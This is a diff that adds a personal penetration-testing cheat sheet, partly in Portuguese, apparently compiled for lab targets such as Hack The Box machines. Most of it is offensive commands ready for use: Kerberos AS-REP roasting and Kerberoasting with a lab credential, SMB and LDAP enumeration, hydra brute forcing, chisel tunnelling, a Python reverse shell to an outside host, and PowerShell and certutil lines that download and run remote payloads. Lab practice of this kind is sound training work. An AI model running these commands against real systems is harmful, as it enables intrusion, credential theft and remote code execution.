@@ -1,0 +1,107 @@
+nmap rapido
+nmap -T5 -sS -p- --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s 10.10.10.76 -> 230.26 seconds
+nmap -v -sS -p- 10.10.10.76 --max-retries 0
+
+AD
+
+ASREPRoasting
+impacket-GetNPUsers -usersfile users.txt -request -outputfile out.john -no-pass -dc-ip ip domain.local/
+impacket-GetNPUsers domain.local/user -request -no-pass -dc-ip ip
+
+Kerberoasting
+impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -request -dc-ip 10.10.10.100
+
+domain name
+ldapsearch -h ip -x -s base namingcontexts
+domain password police
+ldapsearch -x -p 389 -h 10.10.10.169 -b "dc=megabank,dc=local" -s sub "*" | grep lock 
+
+enum usuarios validos
+/opt/kerbrute_linux_amd64 userenum -d dontgoaway.local --dc 10.10.10.10 users.txt
+
+bloodhound
+/home/kali/.local/bin/bloodhound-python -u '' -p '' -ns ipdc -d domain.local -c all
+
+change other password
+net rpc password alvo -U meuuser -S ip
+
+python tty
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+enum - linux
+find . | sed -e "s/[^-][^\/]*\// |/g" -e "s/|\([^ ]\)/|-\1/"
+
+
+
+samba
+extract users via rpcclient
+cat /tmp/allusers.txt | cut -d '[' -f2 | cut -d ']' -f1 > users.txt
+
+enum com mount
+mount -t cifs -o rw,username=ren,password=pass '//ip/share' /mnt/htb
+
+enum recursivo
+smbmap -H ip -R
+
+baixar conteudo
+1 - RECURSE ON
+2 - PROMPT OFF
+3 - mget *
+
+
+
+wordlist
+/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+/usr/share/dirb/wordlists/common.txt
+
+
+ffuf
+ffuf -t 30 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.82/FUZZ
+ffuf -t 30 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://friendzone.red -H 'Host: FUZZ.friendzone.red' -mc 200
+zona
+dig axfr example.com @ns1.example.com
+
+
+python reverse shell
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+chisel
+chisel --reverse --port 9002
+.\chisel.exe client 10.10.14.26:9002 R:3306:localhost:3306
+
+
+--------linux---------
+eliminar ultima linha do arquivo
+sed -i '$ d' foo.txt
+
+
+escrita com shell limitada
+  → cat <<EOT>>
+   → conteudo
+   → > EOT
+   → done
+
+-----------mysql---------
+mysql -u root -p -h
+
+
+reverse shell nishang
+powershell -c "IEX(New-Object Net.WebClient).downloadString('http://192.168.49.168:8080/invoke-powershell.ps1')"
+
+
+
+windows privsec
+netstat -ano
+schtasks /query /fo LIST /v
+
+
+file transfer windows
+smb impacket
+certutil -urlcache -split -f http://192.168.118.3/exploit.ps1 exploit.ps1
+
+
+
+hydra
+hydra -l 100security -P senhas.txt 10.10.10.123 ftp
